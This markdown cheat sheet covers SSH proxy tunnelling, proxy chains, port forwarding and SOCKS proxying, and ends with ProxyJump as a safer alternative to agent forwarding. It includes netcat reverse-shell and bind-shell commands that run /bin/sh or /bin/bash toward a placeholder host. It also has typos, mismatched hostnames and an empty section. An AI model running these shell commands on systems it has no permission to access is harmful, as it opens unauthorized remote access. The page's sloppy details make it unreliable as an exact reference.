# SSH

- [Reverse Shell cheat sheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

## Proxy Tunnelling

- [ProxyTunnel](https://proxytunnel.sourceforge.io/usage.php)
- [Corsscrew](https://github.com/bryanpkc/corkscrew)
- [SSLH](https://www.unixmen.com/sslh-a-sslssh-multiplexer-for-linux/)
- [ProxyCap](http://www.proxycap.com/)

```bash
$ yes | apt install corkscrew
$ ssh -p 22 -o 'ProxyCommand corkscrew -p 192.168.1.1:8118 -d %h:%p' -D 8080 root@demo.stations.net
$ apt install proxytunnel
$ ssh -p 22 -o 'ProxyCommand proxytunnel -p 192.168.1.1:8118 -d %h:%p' -D 8080 root@demo.stations.net
```

```~/.ssh/config
Host demo
User root
Hostname demo.stationx.net
Port 22
DynamicForward 8080
ProxyCommand proxytunnel -p 192.168.1.1:8118 -d %h:%p
```

```bashh
sshh demo
Via 192.168.1.1:8118 -> demo.stationx.net:22
```

## Proxy Chains

```
ssh -v -A -t <user1>@<dns1> ssh -v -A -t <user2>@<dns2> ssh -v -A <user3>@<dns3>
```

Forward local connection to remote address
```
ssh -v -C -D 55557 -L 55556:127.0.0.1:55556 -L 55555:127.0.0.1:55555 <user>:<dns>
```

## Reverse Shell

Server
```sh
$ nc -e /bin/sh <ip-or-dns> <port>
```

Host
```sh
$ nc -l -p 8080 -vvv
> run commands
```

## Remote Port forwarding

```
ssh -R 8080:localhost:9999 user@ip-dns
ssh -R <remote-port>:<map-through-localhost>:<on-localhost-port>
```

```
nc -v -l -p 9999 -e /bin/bash
```

## Local Port Forwarding

## Socs Proxying

```
ssh -fNn -D 8888 user@ip-dns
sudo apt-get install -y tsocks
> nano /etc/tsocks.conf
> tsocs wget http://ipinfo.io/ip -q0 -
```

## Recommended, safer alternatives to SSH agent forwarding

```
# Single jump
$ ssh -J ssh.mozilla.com myhost.private.scl3.mozilla.com

# Jump through 2 hops
$ ssh -J ssh.mozilla.com,ec2-instance.aws.net 10.0.0.3

# Copy data from a host
$ scp -oProxyJump=ssh.mozilla.com myhost.private.scl3.mozilla.com:/home/kang/testfile ./
```
or
```~/.ssh/config
Host *.mozilla.com !ssh.mozilla.com
ProxyJump ssh.mozilla.com
```
